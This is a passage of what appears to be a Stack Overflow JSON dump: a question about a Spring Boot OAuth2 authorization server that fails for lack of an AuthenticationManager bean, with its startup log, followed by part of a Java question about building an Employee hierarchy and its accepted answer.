(_| |  ) ) ) )\r\n      &#39;  |____| .__|_| |_|_| |_\\__, | / / / /\r\n     =========|_|==============|___/=/_/_/_/\r\n     :: Spring Boot ::        (v2.0.1.RELEASE)\r\n    \r\n    2018-04-12 18:07:40.163  INFO 1252 --- [           main] c.m.s.s.AuthorizationServerApplication   : Starting AuthorizationServerApplication on ntkachev with PID 1252 (D:\\work\\sso\\server\\out\\production\\classes started by ntkachev in D:\\work\\sso\\server)\r\n    2018-04-12 18:07:40.166  INFO 1252 --- [           main] c.m.s.s.AuthorizationServerApplication   : No active profile set, falling back to default profiles: default\r\n    2018-04-12 18:07:40.204  INFO 1252 --- [           main] ConfigServletWebServerApplicationContext : Refreshing org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext@8e0379d: startup date [Thu Apr 12 18:07:40 MSK 2018]; root of context hierarchy\r\n    2018-04-12 18:07:41.040  INFO 1252 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8081 (http)\r\n    2018-04-12 18:07:41.060  INFO 1252 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]\r\n    2018-04-12 18:07:41.061  INFO 1252 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet Engine: Apache Tomcat/8.5.29\r\n    2018-04-12 18:07:41.064  INFO 1252 --- [ost-startStop-1] o.a.catalina.core.AprLifecycleListener   : The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: [C:\\Program Files\\Java\\jdk1.8.0_111\\bin;C:\\WINDOWS\\Sun\\Java\\bin;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\TortoiseSVN\\bin;C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\ManagementStudio\\;C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\Common7\\IDE\\PrivateAssemblies\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\nodejs\\;C:\\Program Files (x86)\\Skype\\Phone\\;C:\\Windows\\System32\\;C:\\Program Files\\Java\\jdk1.8.0_111\\bin;C:\\Program Files (x86)\\apache\\apache-maven-3.0.5\\bin;C:\\Program Files (x86)\\gradle-2.3-all\\gradle-2.3\\bin;C:\\Program Files\\7-Zip;C:\\Users\\ntkachev\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\ntkachev\\AppData\\Roaming\\npm;C:\\Python27;D:\\work\\fiddler;.]\r\n    2018-04-12 18:07:41.138  INFO 1252 --- [ost-startStop-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext\r\n    2018-04-12 18:07:41.138  INFO 1252 --- [ost-startStop-1] o.s.web.context.ContextLoader            : Root WebApplicationContext: initialization completed in 936 ms\r\n    2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: &#39;characterEncodingFilter&#39; to: [/*]\r\n    2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: &#39;hiddenHttpMethodFilter&#39; to: [/*]\r\n    2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: &#39;httpPutFormContentFilter&#39; to: [/*]\r\n    2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: &#39;requestContextFilter&#39; to: [/*]\r\n    2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] .s.DelegatingFilterProxyRegistrationBean : Mapping filter: &#39;springSecurityFilterChain&#39; to: [/*]\r\n    2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.ServletRegistrationBean  : Servlet dispatcherServlet mapped to [/]\r\n    2018-04-12 18:07:41.268  WARN 1252 --- [           main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &#39;authServerConfig&#39;: Unsatisfied dependency expressed through field &#39;authenticationManager&#39;; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\r\n    2018-04-12 18:07:41.285  INFO 1252 --- [           main] o.apache.catalina.core.StandardService   : Stopping service [Tomcat]\r\n    2018-04-12 18:07:41.292  INFO 1252 --- [           main] ConditionEvaluationReportLoggingListener : \r\n    \r\n    Error starting ApplicationContext. To display the conditions report re-run your application with &#39;debug&#39; enabled.\r\n    2018-04-12 18:07:41.355 ERROR 1252 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   : \r\n    \r\n    ***************************\r\n    APPLICATION FAILED TO START\r\n    ***************************\r\n    \r\n    Description:\r\n    \r\n    Field authenticationManager in com.my.sso.server.AuthServerConfig required a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; that could not be found.\r\n    \r\n    \r\n    Action:\r\n    \r\n    Consider defining a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; in your configuration.\r\n    \r\n    \r\n    Process finished with exit code 1\r\n\r\n\r\nWhat wrong with my configuration?\r\n\r\n\r\nActually I try to repeat ecxample from http://www.baeldung.com/sso-spring-security-oauth2 and I don&#39;t see explicit declaration of this bean\r\n","title":"Field authenticationManager in *** required a bean of type &#39;org.springframework.security.authentication.AuthenticationManager&#39; that could not be found","body":"<p>I have following class:  </p>\n\n<pre><code>@Configuration\n@EnableAuthorizationServer\npublic class AuthServerConfig extends AuthorizationServerConfigurerAdapter {\n    @Autowired\n    private AuthenticationManager authenticationManager;\n\n    @Override\n    public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {\n        oauthServer.tokenKeyAccess(\"permitAll()\")\n                .checkTokenAccess(\"isAuthenticated()\");\n    }\n\n    @Override\n    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {\n        clients.inMemory()\n                .withClient(\"SampleClientId\")\n                .secret(\"secret\")\n                .authorizedGrantTypes(\"authorization_code\")\n                .scopes(\"user_info\")\n                .autoApprove(true) ;\n    }\n\n    @Override\n    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {\n        endpoints.authenticationManager(authenticationManager);\n    }\n}\n</code></pre>\n\n<p>and following dependencies:</p>\n\n<pre><code>dependencies {\n    compile('org.springframework.boot:spring-boot-starter-web')\n    testCompile('org.springframework.boot:spring-boot-starter-test')\n    compile 'org.springframework.security.oauth:spring-security-oauth2:2.3.2.RELEASE'    \n}\n</code></pre>\n\n<p>When I start application I see following log:</p>\n\n<pre><code>\"C:\\Program Files\\Java\\jdk1.8.0_111\\bin\\java\" -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=50479 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true \"-javaagent:C:\\Program Files\\JetBrains\\IntelliJ IDEA 2017.2.1\\lib\\idea_rt.jar=50480:C:\\Program Files\\JetBrains\\IntelliJ IDEA 2017.2.1\\bin\" -Dfile.encoding=UTF-8 -classpath \"C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\charsets.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\deploy.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\access-bridge-64.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\cldrdata.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\dnsns.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\jaccess.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\jfxrt.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\localedata.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\nashorn.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunec.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunjce_provider.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunmscapi.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\sunpkcs11.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\ext\\zipfs.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\javaws.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jce.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jfr.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jfxswt.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\jsse.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\management-agent.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\plugin.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\resources.jar;C:\\Program Files\\Java\\jdk1.8.0_111\\jre\\lib\\rt.jar;D:\\work\\sso\\server\\out\\production\\classes;D:\\work\\sso\\server\\out\\production\\resources;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-web\\2.0.1.RELEASE\\88751ed76791d12425ce5a80476baf1749a44cf4\\spring-boot-starter-web-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security.oauth\\spring-security-oauth2\\2.3.2.RELEASE\\cf6e03591f593139f1d1d44278d962090aa226c9\\spring-security-oauth2-2.3.2.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-json\\2.0.1.RELEASE\\f2e1aeeb1ac02bfa1b4f7254633484af1866fc65\\spring-boot-starter-json-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter\\2.0.1.RELEASE\\33abc1286b0aabea4f08ff4285d09e587835a716\\spring-boot-starter-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-tomcat\\2.0.1.RELEASE\\4b46f4aaff6c8a5a1c8184996d5e9e8a9354db8d\\spring-boot-starter-tomcat-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.hibernate.validator\\hibernate-validator\\6.0.9.Final\\b149e4cce82379f11f6129eb3187ca8ae5404005\\hibernate-validator-6.0.9.Final.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-webmvc\\5.0.5.RELEASE\\a7fd53c7ad06b0fa7dd4ff347de1b2dc508739e\\spring-webmvc-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security\\spring-security-web\\5.0.4.RELEASE\\bd2592c928d043f70742fd8ae409f751a63132dd\\spring-security-web-5.0.4.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-web\\5.0.5.RELEASE\\d51dbb5cabe72ae02e400577bac48f7fc94088de\\spring-web-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security\\spring-security-config\\5.0.4.RELEASE\\355fc8c3d1c61fe85915082587946ad346250d85\\spring-security-config-5.0.4.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.security\\spring-security-core\\5.0.4.RELEASE\\f2924cd62fa8b14546b2b3c31dcd9e55abf9a5e\\spring-security-core-5.0.4.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-autoconfigure\\2.0.1.RELEASE\\b0bf9d34ed70c6987a86cd58a009065e5fa02545\\spring-boot-autoconfigure-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot\\2.0.1.RELEASE\\b8c5b14cbb0e52fdded8f98a8c1493cc74c7cf59\\spring-boot-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-context\\5.0.5.RELEASE\\9cca4bf5acb693249a01c218f471c677b951d6e2\\spring-context-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-aop\\5.0.5.RELEASE\\b11b61b94d7fb752a1c9bf3461d655c3084fae47\\spring-aop-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-beans\\5.0.5.RELEASE\\984445863c0bbdaaf860615762d998b471a6bf92\\spring-beans-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-expression\\5.0.5.RELEASE\\fc6c7a95aeb7d00f4c65c338b08d97767eb0dd99\\spring-expression-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-core\\5.0.5.RELEASE\\1bd9feb1d9dac6accd27f5244b6c47cfcb55045c\\spring-core-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\commons-codec\\commons-codec\\1.11\\3acb4705652e16236558f0f4f2192cc33c3bd189\\commons-codec-1.11.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.codehaus.jackson\\jackson-mapper-asl\\1.9.13\\1ee2f2bed0e5dd29d1cb155a166e6f8d50bbddb7\\jackson-mapper-asl-1.9.13.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework.boot\\spring-boot-starter-logging\\2.0.1.RELEASE\\10681a28c95e9f9c0159327a1ed0c860517c7ad7\\spring-boot-starter-logging-2.0.1.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\javax.annotation\\javax.annotation-api\\1.3.2\\934c04d3cfef185a8008e7bf34331b79730a9d43\\javax.annotation-api-1.3.2.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.yaml\\snakeyaml\\1.19\\2d998d3d674b172a588e54ab619854d073f555b5\\snakeyaml-1.19.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.datatype\\jackson-datatype-jdk8\\2.9.5\\23e37f085279ba316c0df923513b81609e1d1f6\\jackson-datatype-jdk8-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.datatype\\jackson-datatype-jsr310\\2.9.5\\d1f0d11e816bc04e222a261106ca138801841c2d\\jackson-datatype-jsr310-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.module\\jackson-module-parameter-names\\2.9.5\\f824c60751ffb7bfc3a0d30dfe0e42317d8e67f5\\jackson-module-parameter-names-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.core\\jackson-databind\\2.9.5\\3490508379d065fe3fcb80042b62f630f7588606\\jackson-databind-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.tomcat.embed\\tomcat-embed-websocket\\8.5.29\\37786f4ca8a1597a91a0f437e659a76d1fcc5bf1\\tomcat-embed-websocket-8.5.29.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.tomcat.embed\\tomcat-embed-core\\8.5.29\\51eac5adde4bc019261b787cb99e5548206908e6\\tomcat-embed-core-8.5.29.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.tomcat.embed\\tomcat-embed-el\\8.5.29\\893fb2c87ec1aa248a7911d76c0c06b3fca6bc9b\\tomcat-embed-el-8.5.29.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\javax.validation\\validation-api\\2.0.1.Final\\cb855558e6271b1b32e716d24cb85c7f583ce09e\\validation-api-2.0.1.Final.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.jboss.logging\\jboss-logging\\3.3.2.Final\\3789d00e859632e6c6206adc0c71625559e6e3b0\\jboss-logging-3.3.2.Final.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml\\classmate\\1.3.4\\3d5f48f10bbe4eb7bd862f10c0583be2e0053c6\\classmate-1.3.4.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.springframework\\spring-jcl\\5.0.5.RELEASE\\f4a2854b9d865e8b86717595aec16f877f8c6489\\spring-jcl-5.0.5.RELEASE.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.codehaus.jackson\\jackson-core-asl\\1.9.13\\3c304d70f42f832e0a86d45bd437f692129299a4\\jackson-core-asl-1.9.13.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\ch.qos.logback\\logback-classic\\1.2.3\\7c4f3c474fb2c041d8028740440937705ebb473a\\logback-classic-1.2.3.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.logging.log4j\\log4j-to-slf4j\\2.10.0\\f7e631ccf49cfc0aefa4a2a728da7d374c05bd3c\\log4j-to-slf4j-2.10.0.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.slf4j\\jul-to-slf4j\\1.7.25\\af5364cd6679bfffb114f0dec8a157aaa283b76\\jul-to-slf4j-1.7.25.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.core\\jackson-annotations\\2.9.0\\7c10d545325e3a6e72e06381afe469fd40eb701\\jackson-annotations-2.9.0.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\com.fasterxml.jackson.core\\jackson-core\\2.9.5\\a22ac51016944b06fd9ffbc9541c6e7ce5eea117\\jackson-core-2.9.5.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\ch.qos.logback\\logback-core\\1.2.3\\864344400c3d4d92dfeb0a305dc87d953677c03c\\logback-core-1.2.3.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.slf4j\\slf4j-api\\1.7.25\\da76ca59f6a57ee3102f8f9bd9cee742973efa8a\\slf4j-api-1.7.25.jar;C:\\Users\\ntkachev\\.gradle\\caches\\modules-2\\files-2.1\\org.apache.logging.log4j\\log4j-api\\2.10.0\\fec5797a55b786184a537abd39c3fa1449d752d6\\log4j-api-2.10.0.jar\" com.my.sso.server.AuthorizationServerApplication\n\n  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::        (v2.0.1.RELEASE)\n\n2018-04-12 18:07:40.163  INFO 1252 --- [           main] c.m.s.s.AuthorizationServerApplication   : Starting AuthorizationServerApplication on ntkachev with PID 1252 (D:\\work\\sso\\server\\out\\production\\classes started by ntkachev in D:\\work\\sso\\server)\n2018-04-12 18:07:40.166  INFO 1252 --- [           main] c.m.s.s.AuthorizationServerApplication   : No active profile set, falling back to default profiles: default\n2018-04-12 18:07:40.204  INFO 1252 --- [           main] ConfigServletWebServerApplicationContext : Refreshing org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext@8e0379d: startup date [Thu Apr 12 18:07:40 MSK 2018]; root of context hierarchy\n2018-04-12 18:07:41.040  INFO 1252 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8081 (http)\n2018-04-12 18:07:41.060  INFO 1252 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]\n2018-04-12 18:07:41.061  INFO 1252 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet Engine: Apache Tomcat/8.5.29\n2018-04-12 18:07:41.064  INFO 1252 --- [ost-startStop-1] o.a.catalina.core.AprLifecycleListener   : The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: [C:\\Program Files\\Java\\jdk1.8.0_111\\bin;C:\\WINDOWS\\Sun\\Java\\bin;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\TortoiseSVN\\bin;C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\ManagementStudio\\;C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\Common7\\IDE\\PrivateAssemblies\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\nodejs\\;C:\\Program Files (x86)\\Skype\\Phone\\;C:\\Windows\\System32\\;C:\\Program Files\\Java\\jdk1.8.0_111\\bin;C:\\Program Files (x86)\\apache\\apache-maven-3.0.5\\bin;C:\\Program Files (x86)\\gradle-2.3-all\\gradle-2.3\\bin;C:\\Program Files\\7-Zip;C:\\Users\\ntkachev\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\ntkachev\\AppData\\Roaming\\npm;C:\\Python27;D:\\work\\fiddler;.]\n2018-04-12 18:07:41.138  INFO 1252 --- [ost-startStop-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext\n2018-04-12 18:07:41.138  INFO 1252 --- [ost-startStop-1] o.s.web.context.ContextLoader            : Root WebApplicationContext: initialization completed in 936 ms\n2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: 'characterEncodingFilter' to: [/*]\n2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: 'hiddenHttpMethodFilter' to: [/*]\n2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: 'httpPutFormContentFilter' to: [/*]\n2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.FilterRegistrationBean   : Mapping filter: 'requestContextFilter' to: [/*]\n2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] .s.DelegatingFilterProxyRegistrationBean : Mapping filter: 'springSecurityFilterChain' to: [/*]\n2018-04-12 18:07:41.237  INFO 1252 --- [ost-startStop-1] o.s.b.w.servlet.ServletRegistrationBean  : Servlet dispatcherServlet mapped to [/]\n2018-04-12 18:07:41.268  WARN 1252 --- [           main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authServerConfig': Unsatisfied dependency expressed through field 'authenticationManager'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'org.springframework.security.authentication.AuthenticationManager' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\n2018-04-12 18:07:41.285  INFO 1252 --- [           main] o.apache.catalina.core.StandardService   : Stopping service [Tomcat]\n2018-04-12 18:07:41.292  INFO 1252 --- [           main] ConditionEvaluationReportLoggingListener : \n\nError starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled.\n2018-04-12 18:07:41.355 ERROR 1252 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   : \n\n***************************\nAPPLICATION FAILED TO START\n***************************\n\nDescription:\n\nField authenticationManager in com.my.sso.server.AuthServerConfig required a bean of type 'org.springframework.security.authentication.AuthenticationManager' that could not be found.\n\n\nAction:\n\nConsider defining a bean of type 'org.springframework.security.authentication.AuthenticationManager' in your configuration.\n\n\nProcess finished with exit code 1\n</code></pre>\n\n<p>What wrong with my configuration?</p>\n\n<p>Actually I try to repeat ecxample from <a href=\"http://www.baeldung.com/sso-spring-security-oauth2\" rel=\"noreferrer\">http://www.baeldung.com/sso-spring-security-oauth2</a> and I don't see explicit declaration of this bean</p>\n"},{"tags":["java","object"],"comments":[{"owner":{"account_id":2297089,"reputation":3607,"user_id":2018278,"accept_rate":53,"display_name":"The KNVB"},"score":3,"creation_date":1642391872,"post_id":70736358,"comment_id":125050140,"body_markdown":"What is your expected result?","body":"What is your expected result?"},{"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"score":1,"creation_date":1642391893,"post_id":70736358,"comment_id":125050141,"body_markdown":"What makes you think it hasn&#39;t worked?  It says &quot;The newest employee is: Jake&quot; ...","body":"What makes you think it hasn&#39;t worked?  It says &quot;The newest employee is: Jake&quot; ..."}],"answers":[{"tags":[],"owner":{"account_id":23803283,"reputation":126,"user_id":17813175,"display_name":"Mohaideen Samsudeen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1642399295,"creation_date":1642399295,"answer_id":70737107,"question_id":70736358,"body_markdown":"Below is code which gives the result you expected.\r\n\r\n```\r\npublic class Employee {\r\n    String name;\r\n    List&lt;Employee&gt; subEmployees;\r\n\r\n    public Employee(String employeeName){\r\n        System.out.println(&quot;The newest employee is: &quot; + employeeName);\r\n        name         = employeeName;\r\n        subEmployees = new LinkedList&lt;&gt;();\r\n    }\r\n\r\n    void addSub(Employee subName){\r\n        System.out.println(&quot;Adding &quot; + subName.name + &quot; to the employee list&quot;);\r\n        subEmployees.add(subName);\r\n    }\r\n\r\n    void print(){\r\n        printHelper(0);\r\n    }\r\n\r\n    void printHelper(int level){\r\n        for(int i = 0; i &lt; level; i++){\r\n            System.out.print(&quot;\\t&quot;);\r\n        }\r\n        System.out.println(name);\r\n        if(subEmployees.isEmpty()){\r\n            return;\r\n        }\r\n        for (Employee employee : subEmployees) {\r\n            level = level + 1;\r\n            employee.printHelper(level);\r\n        }\r\n    }\r\n\r\n    public static void main(String args[]){\r\n        Employee susan = new Employee(&quot;Susan&quot;);\r\n        Employee jake  = new Employee(&quot;Jake&quot;); //HERE IS WHERE I NEED HELP\r\n        Employee bevan  = new Employee(&quot;Bevan&quot;); //HERE IS WHERE I NEED HELP\r\n        jake.addSub(bevan);\r\n        susan.addSub(jake);\r\n        susan.print();\r\n    }\r\n}\r\n\r\n```\r\n\r\nAnd the console output is as below.\r\n\r\n```\r\nThe newest employee is: Susan\r\nThe newest employee is: Jake\r\nThe newest employee is: Bevan\r\nAdding Bevan to the employee list\r\nAdding Jake to the employee list\r\nSusan\r\n\tJake\r\n\t\tBevan\r\n\r\n```","title":"Why isn&#39;t my java code able to create multiple instances of an object?","body":"<p>Below is code which gives the result you expected.</p>\n<pre><code>public class Employee {\n    String name;\n    List&lt;Employee&gt; subEmployees;\n\n    public Employee(String employeeName){\n        System.out.println(&quot;The newest employee is: &quot; + employeeName);\n        name         = employeeName;\n        subEmployees = new LinkedList&lt;&gt;();\n    }\n\n    void addSub(Employee subName){\n        System.out.println(&quot;Adding &quot; + subName.name + &quot; to the employee list&quot;);\n        subEmployees.add(subName);\n    }\n\n    void print(){\n        printHelper(0);\n    